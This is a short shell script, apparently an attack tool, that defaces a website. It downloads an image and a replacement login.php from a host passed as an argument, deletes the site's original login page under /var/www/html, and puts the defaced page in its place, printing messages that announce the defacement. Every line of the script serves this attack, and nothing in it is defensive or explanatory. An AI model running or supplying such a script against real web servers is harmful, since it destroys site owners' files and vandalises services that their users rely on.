echo "Getting defacement from target machine";
wget http://$1/anonymous.jfif;
mv anonymous.jfif /var/www/html/uploadImage/Logo/anonymous.jfif;
echo "Replacing original home/login page with a defaced website";
rm /var/www/html/login.php;
wget http://$1/login.php;
mv login.php /var/www/html/login.php;
echo "Done, defacement was successful";